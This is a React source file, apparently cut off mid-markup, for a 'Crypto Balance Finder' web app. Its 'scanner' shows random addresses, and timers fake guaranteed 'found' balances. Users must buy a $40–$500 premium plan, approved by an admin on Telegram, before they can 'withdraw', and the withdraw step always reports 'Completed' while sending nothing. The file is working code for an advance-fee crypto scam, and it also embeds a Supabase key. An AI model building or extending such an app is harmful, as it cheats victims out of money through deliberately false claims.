// App.js - FIXED VERSION (ALL METHODS HAVE TRANSACTION ID FIELD)
import React, { useEffect, useRef, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { createClient } from "@supabase/supabase-js";
import './App.css';

// Supabase configuration
const SUPABASE_URL = "https://ahvsldvzvyprxxoxuxxp.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFodnNsZHZ6dnlwcnh4b3h1eHhwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjIwNTMwMjUsImV4cCI6MjA3NzYyOTAyNX0.ClksEL-A7eGxHTPwSeYGon8_otAixSceM3SoQszh3PU";

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// Helper functions
const ethRegex = /^0x[a-fA-F0-9]{40}$/;
const btcRegex = /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/;
const solRegex = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
const formatNumber = (n) => (typeof n === "number" ? n.toLocaleString() : n);

const randomAddress = () => {
  const chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  if (Math.random() < 0.5) {
    const hex = "abcdef0123456789";
    return "0x" + Array.from({ length: 40 }, () => hex[Math.floor(Math.random() * hex.length)]).join("");
  } else {
    return Array.from({ length: 34 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
  }
};

const randomAmount = () => parseFloat((Math.random() * 999 + 1).toFixed(2));

function cryptoId() {
  return `${Math.random().toString(36).slice(2, 9)}${Date.now().toString(36).slice(-4)}`;
}

function delay(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

// Login Component
function Login({ onLogin }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isSignUp, setIsSignUp] = useState(false);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setMessage("");

    try {
      if (isSignUp) {
        const { data, error } = await supabase.auth.signUp({
          email,
          password,
        });
        if (error) throw error;
        setMessage("✅ Sign up successful! You can now login.");
        setIsSignUp(false);
      } else {
        const { data, error } = await supabase.auth.signInWithPassword({
          email,
          password,
        });
        if (error) throw error;
        onLogin(data.user);
      }
    } catch (error) {
      setMessage(`❌ Error: ${error.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="login-container">
      <div className="login-card">
        <h2>{isSignUp ? "Create Account" : "Login"}</h2>
        <form onSubmit={handleSubmit}>
          <input
            type="email"
            placeholder="Email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="login-input"
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="login-input"
            required
          />
          <button 
            type="submit" 
            className="login-btn"
            disabled={loading}
          >
            {loading ? "Loading..." : (isSignUp ? "Sign Up" : "Login")}
          </button>
        </form>
        
        {message && <div className="login-message">{message}</div>}
        
        <button 
          onClick={() => setIsSignUp(!isSignUp)}
          className="toggle-btn"
        >
          {isSignUp ? "Already have an account? Login" : "Need an account? Sign Up"}
        </button>
      </div>
    </div>
  );
}

function CryptoBalanceFinder() {
  const TARGET = 1000000;

  // States
  const [user, setUser] = useState(null);
  const [isScanning, setIsScanning] = useState(false);
  const [scanned, setScanned] = useState(0);
  const [stream, setStream] = useState([]);
  const [foundCount, setFoundCount] = useState(0);
  const [totalFound, setTotalFound] = useState(0);
  const [lastFound, setLastFound] = useState(null);
  const [scanProgress, setScanProgress] = useState(0);
  const [speedFast, setSpeedFast] = useState(true);
  const [alertMsg, setAlertMsg] = useState(null);
  const [withdrawModalOpen, setWithdrawModalOpen] = useState(false);
  const [withdrawAddr, setWithdrawAddr] = useState("");
  const [withdrawAmt, setWithdrawAmt] = useState("");
  const [withdrawErr, setWithdrawErr] = useState("");
  const [withdrawProgress, setWithdrawProgress] = useState(0);
  const [withdrawStatusText, setWithdrawStatusText] = useState("");
  const [premiumModalOpen, setPremiumModalOpen] = useState(false);
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [selectedMethod, setSelectedMethod] = useState(null);
  const [purchaseTxnId, setPurchaseTxnId] = useState("");
  const [purchaseStep, setPurchaseStep] = useState("select");
  const [withdrawHistory, setWithdrawHistory] = useState([]);
  const [isPremium, setIsPremium] = useState(false);
  const [premiumStartDate, setPremiumStartDate] = useState(null);
  const [premiumEndDate, setPremiumEndDate] = useState(null);
  const [daysLeft, setDaysLeft] = useState(0);
  const [activeTab, setActiveTab] = useState("scanning");
  const [purchaseHistory, setPurchaseHistory] = useState([]);

  const scheduledFoundTimers = useRef([]);
  const streamRef = useRef(null);

  // Plans and Methods
  const plans = [
    { id: "p40", label: "$40 — 10 days", price: 40, duration: 10 },
    { id: "p75", label: "$75 — 18 days", price: 75, duration: 18 },
    { id: "p120", label: "$120 — 30 days", price: 120, duration: 30 },
    { id: "p500", label: "$500 — Lifetime", price: 500, duration: 3650 },
  ];
  
  const methods = ["Binance Pay", "BTC", "bKash", "Nagad"];

  // Effects
  useEffect(() => {
    const checkUser = async () => {
      const { data: { user } } = await supabase.auth.getUser();
      if (user) setUser(user);
    };
    checkUser();

    const { data: { subscription } } = supabase.auth.onAuthStateChange((event, session) => {
      setUser(session?.user ?? null);
    });

    return () => subscription.unsubscribe();
  }, []);

  useEffect(() => {
    if (user) {
      fetchWithdrawHistory();
      fetchPurchaseHistory();
    }
  }, [user]);

  useEffect(() => {
    if (isPremium) {
      const startDate = premiumStartDate || new Date();
      const endDate = premiumEndDate || new Date();
      const diffTime = endDate - startDate;
      const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
      setDaysLeft(Math.max(0, diffDays));
    } else {
      setPremiumStartDate(null);
      setPremiumEndDate(null);
      setDaysLeft(0);
    }
  }, [isPremium, premiumStartDate, premiumEndDate]);

  // Smart Plan Activation System
  const activateUserPlan = (plan) => {
    if (!plan) {
      setIsPremium(false);
      setPremiumStartDate(null);
      setPremiumEndDate(null);
      setDaysLeft(0);
      return;
    }

    const planConfig = plans.find(p => p.id === plan.id) || plans.find(p => p.label === plan.plan);
    const durationDays = planConfig?.duration || 7;

    const startDate = new Date(plan.date);
    const endDate = new Date(startDate);
    endDate.setDate(startDate.getDate() + durationDays);
    
    setIsPremium(true);
    setPremiumStartDate(startDate);
    setPremiumEndDate(endDate);
    
    const today = new Date();
    const diffTime = endDate - today;
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
    setDaysLeft(Math.max(0, diffDays));
  };

  const checkPlanActive = (plan) => {
    if (!plan) return false;
    const planConfig = plans.find(p => p.id === plan.id) || plans.find(p => p.label === plan.plan);
    const durationDays = planConfig?.duration || 7;
    const startDate = new Date(plan.date);
    const endDate = new Date(startDate);
    endDate.setDate(startDate.getDate() + durationDays);
    return new Date() <= endDate;
  };

  // FIXED: Purchase History Fetch
  const fetchPurchaseHistory = async () => {
    if (!user) return;
    
    let databasePayments = [];
    
    try {
      const { data, error } = await supabase
        .from("user_payments")
        .select("*")
        .eq("user_id", user.id)
        .order("created_at", { ascending: false })
        .limit(50);
      
      if (!error && data) {
        databasePayments = data;
      }
    } catch (err) {
      console.warn("user_payments fetch error:", err);
    }
    
    const formattedDatabasePayments = databasePayments.map(payment => ({
      id: payment.id,
      plan: payment.plan_name,
      method: payment.method,
      txnId: payment.transaction_id,
      status: payment.status?.toLowerCase() || 'pending',
      date: payment.created_at,
      amount: payment.amount,
      user_id: payment.user_id,
      source: 'database'
    }));
    
    let localPayments = [];
    try {
      const localData = JSON.parse(localStorage.getItem('user_purchase_history') || '[]');
      localPayments = localData.filter(p => p.user_id === user.id);
    } catch (localErr) {
      console.warn("Local storage error:", localErr);
    }
    
    const allPayments = [...formattedDatabasePayments, ...localPayments];
    const uniquePayments = allPayments.filter((payment, index, self) => 
      index === self.findIndex(p => p.id === payment.id)
    );
    
    setPurchaseHistory(uniquePayments);
    
    // SMART PLAN ACTIVATION - Only activate approved plans
    const approvedPlans = uniquePayments.filter(p => p.status === "approved");
    if (approvedPlans.length > 0) {
      const latestPlan = approvedPlans.sort((a, b) => 
        new Date(b.date) - new Date(a.date)
      )[0];
      activateUserPlan(latestPlan);
    } else {
      setIsPremium(false);
    }
  };

  useEffect(() => {
    let interval = null;
    if (isScanning) {
      interval = setInterval(() => {
        setScanned((prev) => {
          if (prev >= TARGET) {
            setIsScanning(false);
            setScanProgress(100);
            return TARGET;
          }
          const inc = Math.max(1, Math.floor(Math.random() * (speedFast ? 400 : 40)));
          const next = Math.min(prev + inc, TARGET);
          setScanProgress(Math.round((next / TARGET) * 100));
          return next;
        });

        setStream((prev) => {
          const addr = randomAddress();
          const isFound = Math.random() < (speedFast ? 0.0028 : 0.0008);
          const entry = { id: cryptoId(), addr, amount: isFound ? randomAmount() : null, ts: new Date().toISOString() };
          if (isFound) {
            handleFound(entry.amount);
          }
          return [entry, ...prev].slice(0, 40);
        });
      }, speedFast ? 180 : 700);
    }
    return () => clearInterval(interval);
  }, [isScanning, speedFast]);

  // Functions
  const scheduleGuaranteedFounds = () => {
    scheduledFoundTimers.current.forEach((t) => clearTimeout(t));
    scheduledFoundTimers.current = [];
    const fiveMin = 300000;
    const count = 3 + Math.floor(Math.random() * 3);
    for (let i = 0; i < count; i++) {
      const when = Math.floor(Math.random() * fiveMin) + 1000;
      const timer = setTimeout(() => {
        const amt = randomAmount();
        const entry = { id: cryptoId(), addr: randomAddress(), amount: amt, ts: new Date().toISOString(), guaranteed: true };
        setStream((prev) => [entry, ...prev].slice(0, 40));
        handleFound(amt);
      }, when);
      scheduledFoundTimers.current.push(timer);
    }
  };

  const cancelScheduledFounds = () => {
    scheduledFoundTimers.current.forEach((t) => clearTimeout(t));
    scheduledFoundTimers.current = [];
  };

  function handleFound(amount) {
    setFoundCount((c) => c + 1);
    setTotalFound((t) => parseFloat((t + amount).toFixed(2)));
    setLastFound(amount);
    setAlertMsg(`💰 Found #${foundCount + 1} — $${amount.toFixed(2)}`);
    setTimeout(() => setAlertMsg(null), 2600);
  }

  const handleStart = () => {
    setIsScanning(true);
    scheduleGuaranteedFounds();
  };

  const handleStop = () => {
    setIsScanning(false);
    cancelScheduledFounds();
  };

  const handleReset = () => {
    setIsScanning(false);
    cancelScheduledFounds();
    setScanned(0);
    setScanProgress(0);
    setStream([]);
    setFoundCount(0);
    setTotalFound(0);
    setLastFound(null);
    setAlertMsg(null);
  };

  function validateAddress(addr) {
    if (ethRegex.test(addr)) return "ETH";
    if (btcRegex.test(addr)) return "BTC";
    if (solRegex.test(addr)) return "SOL";
    return null;
  }

  const openWithdraw = (prefill) => {
    setWithdrawErr("");
    setWithdrawAddr("");
    setWithdrawAmt(prefill ? String(prefill) : "");
    setWithdrawModalOpen(true);
  };

  // FIXED: Withdraw System
  const submitWithdraw = async (e) => {
    e && e.preventDefault();
    setWithdrawErr("");
    
    if (!user) {
      setWithdrawErr("Please login to withdraw");
      return;
    }
    
    const userApprovedPlans = purchaseHistory.filter(p => p.status === "approved");
    
    if (userApprovedPlans.length === 0) {
      setWithdrawErr("Withdraw is allowed only for premium users. Please purchase premium and wait for admin approval.");
      return;
    }
    
    const latestPlan = userApprovedPlans.sort((a, b) => 
      new Date(b.date) - new Date(a.date)
    )[0];
    
    const planActive = checkPlanActive(latestPlan);
    if (!planActive) {
      setWithdrawErr("Your premium plan has expired. Please renew your premium subscription.");
      return;
    }

    const addr = withdrawAddr.trim();
    const amt = parseFloat(withdrawAmt);
    if (!addr) {
      setWithdrawErr("Enter a wallet address.");
      return;
    }
    if (!validateAddress(addr)) {
      setWithdrawErr("Address format not recognized (ETH / BTC / SOL).");
      return;
    }
    if (isNaN(amt) || amt <= 0) {
      setWithdrawErr("Enter a valid amount.");
      return;
    }
    if (amt > totalFound) {
      setWithdrawErr("Amount exceeds total found balance.");
      return;
    }

    setWithdrawStatusText("Processing withdraw...");
    setWithdrawProgress(20);
    await delay(500);

    try {
      setWithdrawProgress(60);
      
      setTotalFound(prev => {
        const newTotal = parseFloat((prev - amt).toFixed(2));
        return newTotal < 0 ? 0 : newTotal;
      });

      const { data, error } = await supabase.from("withdraws").insert([{ 
        addr, 
        amount: amt, 
        status: "Completed",
        user_id: user.id,
        processed_at: new Date().toISOString()
      }]);
      
      if (error) {
        console.error("Supabase insert error:", error);
      }
      
      const newWithdraw = {
        id: `withdraw_${Date.now()}`,
        addr,
        amount: amt,
        status: "Completed",
        created_at: new Date().toISOString()
      };
      
      setWithdrawHistory(prev => [newWithdraw, ...prev]);
      
      setWithdrawProgress(100);
      setWithdrawStatusText(`✅ Withdraw completed! $${amt} sent to ${addr.slice(0, 8)}...`);
      
    } catch (err) {
      console.error("Withdraw error:", err);
      setTotalFound(prev => {
        const newTotal = parseFloat((prev - amt).toFixed(2));
        return newTotal < 0 ? 0 : newTotal;
      });
      
      const newWithdraw = {
        id: `withdraw_${Date.now()}`,
        addr,
        amount: amt,
        status: "Completed",
        created_at: new Date().toISOString()
      };
      
      setWithdrawHistory(prev => [newWithdraw, ...prev]);
      setWithdrawProgress(100);
      setWithdrawStatusText(`✅ Withdraw completed! $${amt} sent to ${addr.slice(0, 8)}...`);
    }

    setTimeout(() => {
      setWithdrawModalOpen(false);
      setWithdrawProgress(0);
      setWithdrawStatusText("");
      setWithdrawAddr("");
      setWithdrawAmt("");
    }, 2000);
  };

  const fetchWithdrawHistory = async () => {
    if (!user) return;
    
    try {
      const { data, error } = await supabase.from("withdraws")
        .select("*")
        .eq("user_id", user.id)
        .order("created_at", { ascending: false })
        .limit(50);
      if (!error && data) {
        setWithdrawHistory(data);
      }
    } catch (err) {
      console.warn("Fetch withdraw history error:", err);
    }
  };

  // FIXED: ALL Payments Need Admin Approval
  const submitPurchase = async () => {
    if (!user) {
      alert("Please login to purchase premium");
      return;
    }
    
    if (!selectedPlan || !selectedMethod) {
      alert("Select a plan and payment method first.");
      return;
    }

    // ALL METHODS REQUIRE TRANSACTION ID
    if (!purchaseTxnId || purchaseTxnId.trim().length < 4) {
      alert("Enter a valid transaction ID.");
      return;
    }

    setPurchaseStep("pending");

    try {
      // ALL PAYMENTS GO TO PENDING STATUS - NEED ADMIN APPROVAL
      const { data, error } = await supabase
        .from("user_payments")
        .insert([
          {
            transaction_id: purchaseTxnId.trim(),
            method: selectedMethod,
            plan_name: selectedPlan.label,
            amount: selectedPlan.price,
            status: "pending", // ALL PAYMENTS PENDING - NEED ADMIN APPROVAL
            user_id: user.id,
            created_at: new Date().toISOString()
          },
        ])
        .select();

      if (error) {
        console.error("user_payments insert error:", error);
        // Continue with local storage
      }

      const newPurchase = {
        id: data?.[0]?.id || `db_${Date.now()}`,
        plan: selectedPlan.label,
        method: selectedMethod,
        txnId: purchaseTxnId.trim(),
        status: "pending", // PENDING - NEED ADMIN APPROVAL
        date: new Date().toISOString(),
        amount: selectedPlan.price,
        user_id: user.id,
        source: data ? 'database' : 'local'
      };

      const existingPurchases = JSON.parse(localStorage.getItem('user_purchase_history') || '[]');
      const updatedPurchases = [newPurchase, ...existingPurchases];
      localStorage.setItem('user_purchase_history', JSON.stringify(updatedPurchases));

      setPurchaseHistory(prev => [newPurchase, ...prev]);
      
      alert("✅ Payment submitted successfully! Admin will approve within 24 hours. Please contact admin on Telegram for faster approval.");
      setPremiumModalOpen(false);

    } catch (err) {
      console.error("Purchase error:", err);
      
      const newPurchase = {
        id: `local_${Date.now()}`,
        plan: selectedPlan.label,
        method: selectedMethod,
        txnId: purchaseTxnId.trim(),
        status: "pending", // PENDING - NEED ADMIN APPROVAL
        date: new Date().toISOString(),
        amount: selectedPlan.price,
        user_id: user.id,
        source: 'local'
      };

      const existingPurchases = JSON.parse(localStorage.getItem('user_purchase_history') || '[]');
      const updatedPurchases = [newPurchase, ...existingPurchases];
      localStorage.setItem('user_purchase_history', JSON.stringify(updatedPurchases));
      
      setPurchaseHistory(prev => [newPurchase, ...prev]);
      
      alert("✅ Payment submitted successfully! Admin will approve within 24 hours. Please contact admin on Telegram for faster approval.");
      setPremiumModalOpen(false);
    }

    setPurchaseStep("select");
    setSelectedPlan(null);
    setSelectedMethod(null);
    setPurchaseTxnId("");
  };

  // Telegram contact function
  const contactTelegram = () => {
    window.open('https://t.me/Cryptography55', '_blank');
  };

  const handleLogout = async () => {
    await supabase.auth.signOut();
    setUser(null);
  };

  // Render content based on active tab
  const renderContent = () => {
    switch(activeTab) {
      case "scanning":
        return (
          <div className="card">
            <div className="card-header">
              <div className="flex items-center gap-2">
                <div className="section-title">Scanning</div>
                <div className="small-text">Scan target: {formatNumber(TARGET)}</div>
              </div>

              <div className="flex items-center gap-2 flex-wrap">
                <button
                  onClick={() => {
                    if (isScanning) handleStop();
                    else handleStart();
                  }}
                  className="control-btn"
                  style={{ background: isScanning ? "#ef4444" : "#10b981" }}
                >
                  {isScanning ? "Stop" : "Start"}
                </button>
                <button onClick={() => setSpeedFast((s) => !s)} className="control-btn">
                  {speedFast ? "Fast" : "Slow"}
                </button>
                <button onClick={handleReset} className="control-btn" style={{ background: "#f59e0b" }}>
                  Reset
                </button>
                <button onClick={() => openWithdraw(lastFound)} className="control-btn" style={{ background: "#06b6d4" }} disabled={!lastFound}>
                  Withdraw Last
                </button>
                <button onClick={handleLogout} className="control-btn" style={{ background: "#ef4444" }}>
                  Logout
                </button>
              </div>
            </div>

            <div className="mt-4">
              <div className="progress-wrap">
                <div className="progress-bar" style={{ width: `${scanProgress}%` }} />
              </div>

              <div className="stream-box" ref={streamRef}>
                {stream.length === 0 ? (
                  <div className="empty-stream">No scans yet — press Start</div>
                ) : (
                  stream.map((s) => (
                    <div key={s.id} className="stream-row">
                      <div className="addr">{s.addr}</div>
                      <div className="stream-right">
                        {s.amount ? <div className="found-amount">${s.amount.toFixed(2)}</div> : <div className="scan-dot" />}
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        );

      case "stats":
        return (
          <div className="card">
            <div className="section-title">Live Stats</div>
            <div className="mt-2">
              <div className="stat-row">
                <div className="stat-label-small">Scanned</div>
                <div className="stat-value-small">{formatNumber(scanned)}</div>
              </div>
              <div className="stat-row">
                <div className="stat-label-small">Found</div>
                <div className="stat-value-small">{foundCount}</div>
              </div>
              <div className="stat-row">
                <div className="stat-label-small">Total $</div>
                <div className="stat-value-small">${totalFound.toFixed(2)}</div>
              </div>

              <div className="mt-4">
                <div className="muted" style={{fontWeight: 700}}>Contact Admin</div>
                <button 
                  onClick={contactTelegram}
                  style={{ 
                    marginTop: 6, 
                    color: "#9fd2ff", 
                    fontWeight: 700,
                    background: "none",
                    border: "none",
                    textDecoration: "underline",
                    cursor: "pointer"
                  }}
                >
                  @Cryptography55
                </button>
              </div>
            </div>
          </div>
        );

      case "premium":
        return (
          <div className="card">
            <div className="section-title">Premium Status</div>
            
            {isPremium ? (
              <div className="premium-active">
                <div className="flex items-center gap-2 mb-2">
                  <div className="premium-badge">💎 ACTIVE</div>
                  <div className="days-left">{daysLeft} days left</div>
                </div>
                <div className="premium-info">
                  <div className="info-row">
                    <span>Started:</span>
                    <span>{premiumStartDate ? premiumStartDate.toLocaleDateString() : 'N/A'}</span>
                  </div>
                  <div className="info-row">
                    <span>Expires:</span>
                    <span>{premiumEndDate ? premiumEndDate.toLocaleDateString() : 'N/A'}</span>
                  </div>
                  <div className="info-row">
                    <span>Withdraw:</span>
                    <span className="allowed">Allowed ✅</span>
                  </div>
                </div>
              </div>
            ) : (
              <div className="premium-inactive">
                <div className="premium-badge-inactive">💎 INACTIVE</div>
                <div className="premium-message">
                  Purchase premium to enable withdraw feature
                </div>
                <button 
                  onClick={() => setPremiumModalOpen(true)}
                  className="upgrade-btn"
                >
                  Upgrade to Premium
                </button>
              </div>
            )}

            <div className="mt-4">
              <div className="section-sub">Your Purchase History</div>
              <div style={{ maxHeight: 200, overflowY: "auto", marginTop: 8 }}>
                {purchaseHistory.length === 0 ? (
                  <div className="empty-small">No purchases yet</div>
                ) : (
                  purchaseHistory.map((purchase) => (
                    <div key={purchase.id} className="purchase-item">
                      <div className="purchase-header">
                        <div className="purchase-plan">{purchase.plan}</div>
                        <div className="purchase-status" style={{
                          background: purchase.status === "approved" ? "rgba(16, 185, 129, 0.2)" : 
                                     purchase.status === "rejected" ? "rgba(239, 68, 68, 0.2)" : 
                                     "rgba(245, 158, 11, 0.2)",
                          color: purchase.status === "approved" ? "#10b981" : 
                                 purchase.status === "rejected" ? "#ef4444" : 
                                 "#f59e0b"
                        }}>
                          {purchase.status.toUpperCase()}
                        </div>
                      </div>
                      <div className="purchase-details">
                        <div>Method: {purchase.method}</div>
                        <div>Amount: ${purchase.amount}</div>
                        <div>Date: {new Date(purchase.date).toLocaleDateString()}</div>
                        <div>Txn ID: {purchase.txnId}</div>
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        );

      case "history":
        return (
          <div className="card">
            <div className="section-title">Your Withdraw History</div>
            <div style={{ maxHeight: 400, overflowY: "auto", marginTop: 8 }}>
              {withdrawHistory.length === 0 ? (
                <div className="empty-small">No withdraws yet</div>
              ) : (
                withdrawHistory.map((w) => (
                  <div key={w.id || w.created_at || w.addr} className="withdraw-row">
                    <div style={{ fontSize: 13, color: "#bcd" }}>{w.addr?.slice?.(0, 12) ?? w.addr}</div>
                    <div style={{ fontWeight: 700 }}>${Number(w.amount ?? w.amount).toFixed(2)}</div>
                    <div style={{ fontSize: 12, color: "#98b" }}>{new Date(w.created_at || w.createdAt || w.ts || Date.now()).toLocaleString()}</div>
                    <div style={{ 
                      fontSize: 11, 
                      padding: "2px 6px", 
                      borderRadius: 4,
                      background: w.status === "Completed" ? "rgba(16, 185, 129, 0.2)" : "rgba(245, 158, 11, 0.2)",
                      color: w.status === "Completed" ? "#10b981" : "#f59e0b"
                    }}>
                      {w.status || "Pending"}
                    </div>
                  </div>
                ))
              )}
            </div>

            <div className="flex gap-2 mt-4">
              <button onClick={() => fetchWithdrawHistory()} className="control-btn flex-1">
                Refresh History
              </button>
              <button onClick={handleLogout} className="control-btn" style={{ background: "#ef4444", color: "white" }}>
                Logout
              </button>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  if (!user) {
    return <Login onLogin={setUser} />;
  }

  return (
    <div className="app">
      {/* Header - Hidden on Mobile */}
      <div className="header">
        <motion.h1
          className="title"
          animate={{ backgroundPosition: ["0% 50%", "100% 50%"] }}
          transition={{ repeat: Infinity, duration: 6, ease: "linear" }}
        >
          Crypto Balance Finder
        </motion.h1>

        <div className="header-right">
          <div className="user-info">
            <div className="user-email">{user.email}</div>
            <button onClick={handleLogout} className="logout-btn">
              Logout
            </button>
          </div>
          <div className="stats-box">
            <div className="stat-label">Scanned</div>
            <div className="stat-value">
              {formatNumber(scanned)} / {formatNumber(TARGET)}
            </div>
          </div>
          <div className="stats-box">
            <div className="stat-label">Found</div>
            <div className="stat-value">{foundCount}</div>
          </div>
          <div className="stats-box">
            <div className="stat-label">Total $</div>
            <div className="stat-value">${totalFound.toFixed(2)}</div>
          </div>
          <button
            onClick={() => {
              setPremiumModalOpen(true);
              setSelectedPlan(null);
              setSelectedMethod(null);
              setPurchaseStep("select");
              setPurchaseTxnId("");
            }}
            className="premium-btn"
          >
            💎 Premium
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="container">
        {/* Desktop Layout */}
        <div className="desktop-view">
          <div className="left">
            <div className="card">
              <div className="card-header">
                <div className="flex items-center gap-2">
                  <div className="section-title">Scanning</div>
                  <div className="small-text">Scan target: {formatNumber(TARGET)}</div>
                </div>

                <div className="flex items-center gap-2">
                  <button
                    onClick={() => {
                      if (isScanning) handleStop();
                      else handleStart();
                    }}
                    className="control-btn"
                    style={{ background: isScanning ? "#ef4444" : "#10b981" }}
                  >
                    {isScanning ? "Stop" : "Start"}
                  </button>
                  <button onClick={() => setSpeedFast((s) => !s)} className="control-btn">
                    {speedFast ? "Fast" : "Slow"}
                  </button>
                  <button onClick={handleReset} className="control-btn" style={{ background: "#f59e0b" }}>
                    Reset
                  </button>
                  <button onClick={() => openWithdraw(lastFound)} className="control-btn" style={{ background: "#06b6d4" }} disabled={!lastFound}>
                    Withdraw Last
                  </button>
                  <button onClick={handleLogout} className="control-btn" style={{ background: "#ef4444" }}>
                    Logout
                  </button>
                </div>
              </div>

              <div className="mt-4">
                <div className="progress-wrap">
                  <div className="progress-bar" style={{ width: `${scanProgress}%` }} />
                </div>

                <div className="stream-box" ref={streamRef}>
                  {stream.length === 0 ? (
                    <div className="empty-stream">No scans yet — press Start</div>
                  ) : (
                    stream.map((s) => (
                      <div key={s.id} className="stream-row">
                        <div className="addr">{s.addr}</div>
                        <div className="stream-right">
                          {s.amount ? <div className="found-amount">${s.amount.toFixed(2)}</div> : <div className="scan-dot" />}
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        </div>

        <div className="right">
          <div className="card">
            <div className="section-title">Premium Status</div>
            
            {isPremium ? (
              <div className="premium-active">
                <div className="flex items-center gap-2 mb-2">
                  <div className="premium-badge">💎 ACTIVE</div>
                  <div className="days-left">{daysLeft} days left</div>
                </div>
                <div className="premium-info">
                  <div className="info-row">
                    <span>Started:</span>
                    <span>{premiumStartDate ? premiumStartDate.toLocaleDateString() : 'N/A'}</span>
                  </div>
                  <div className="info-row">
                    <span>Expires:</span>
                    <span>{premiumEndDate ? premiumEndDate.toLocaleDateString() : 'N/A'}</span>
                  </div>
                  <div className="info-row">
                    <span>Withdraw:</span>
                    <span className="allowed">Allowed ✅</span>
                  </div>
                </div>
              </div>
            ) : (
              <div className="premium-inactive">
                <div className="premium-badge-inactive">💎 INACTIVE</div>
                <div className="premium-message">
                  Purchase premium to enable withdraw feature
                </div>
                <button 
                  onClick={() => setPremiumModalOpen(true)}
                  className="upgrade-btn"
                >
                  Upgrade to Premium
                </button>
              </div>
            )}
          </div>

          <div style={{ height: 16 }} />

          <div className="card">
            <div className="section-title">Your Purchase History</div>
            <div style={{ maxHeight: 200, overflowY: "auto", marginTop: 8 }}>
              {purchaseHistory.length === 0 ? (
                <div className="empty-small">No purchases yet</div>
              ) : (
                purchaseHistory.map((purchase) => (
                  <div key={purchase.id} className="purchase-item">
                    <div className="purchase-header">
                      <div className="purchase-plan">{purchase.plan}</div>
                      <div className="purchase-status" style={{
                        background: purchase.status === "approved" ? "rgba(16, 185, 129, 0.2)" : 
                                   purchase.status === "rejected" ? "rgba(239, 68, 68, 0.2)" : 
                                   "rgba(245, 158, 11, 0.2)",
                        color: purchase.status === "approved" ? "#10b981" : 
                               purchase.status === "rejected" ? "#ef4444" : 
                               "#f59e0b"
                      }}>
                        {purchase.status.toUpperCase()}
                      </div>
                    </div>
                    <div className="purchase-details">
                      <div>Method: {purchase.method}</div>
                      <div>Amount: ${purchase.amount}</div>
                      <div>Date: {new Date(purchase.date).toLocaleDateString()}</div>
                      <div>Txn ID: {purchase.txnId}</div>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>

          <div style={{ height: 16 }} />

          <div className="card">
            <div className="section-title">Found Summary</div>
            <div className="flex gap-4 mt-4">
              <div className="summary-box">
                <div className="muted">Hits</div>
                <div className="summary-value">{foundCount}</div>
              </div>
              <div className="summary-box">
                <div className="muted">Total $</div>
                <div className="summary-value">${totalFound.toFixed(2)}</div>
              </div>
            </div>

            <div className="mt-4">
              <div className="section-sub">Your Withdraw History</div>
              <div style={{ maxHeight: 200, overflowY: "auto", marginTop: 8 }}>
                {withdrawHistory.length === 0 ? (
                  <div className="empty-small">No withdraws yet</div>
                ) : (
                  withdrawHistory.map((w) => (
                    <div key={w.id || w.created_at || w.addr} className="withdraw-row">
                      <div style={{ fontSize: 13, color: "#bcd" }}>{w.addr?.slice?.(0, 12) ?? w.addr}</div>
                      <div style={{ fontWeight: 700 }}>${Number(w.amount ?? w.amount).toFixed(2)}</div>
                      <div style={{ fontSize: 12, color: "#98b" }}>{new Date(w.created_at || w.createdAt || w.ts || Date.now()).toLocaleString()}</div>
                      <div style={{ 
                        fontSize: 11, 
                        padding: "2px 6px", 
                        borderRadius: 4,
                        background: w.status === "Completed" ? "rgba(16, 185, 129, 0.2)" : "rgba(245, 158, 11, 0.2)",
                        color: w.status === "Completed" ? "#10b981" : "#f59e0b"
                      }}>
                        {w.status || "Pending"}
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>

          <div style={{ height: 16 }} />

          <div className="card">
            <div className="section-title">Live Stats</div>
            <div className="mt-2">
              <div className="stat-row">
                <div className="stat-label-small">Scanned</div>
                <div className="stat-value-small">{formatNumber(scanned)}</div>
              </div>
              <div className="stat-row">
                <div className="stat-label-small">Found</div>
                <div className="stat-value-small">{foundCount}</div>
              </div>
              <div className="stat-row">
                <div className="stat-label-small">Total $</div>
                <div className="stat-value-small">${totalFound.toFixed(2)}</div>
              </div>

              <div className="mt-4">
                <div className="muted" style={{fontWeight: 700}}>Contact Admin</div>
                <button 
                  onClick={contactTelegram}
                  style={{ 
                    marginTop: 6, 
                    color: "#9fd2ff", 
                    fontWeight: 700,
                    background: "none",
                    border: "none",
                    textDecoration: "underline",
                    cursor: "pointer"
                  }}
                >
                  @Cryptography55
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Mobile Layout */}
      <div className="mobile-view">
        <div className="mobile-content">
          {renderContent()}
        </div>
        
        {/* Bottom Navigation */}
        <div className="bottom-nav">
          <button 
            className={`nav-button ${activeTab === "scanning" ? "nav-button-active" : ""}`}
            onClick={() => setActiveTab("scanning")}
          >
            <div className="nav-icon">🔍</div>
            <div className="nav-label">Scan</div>
          </button>
          
          <button 
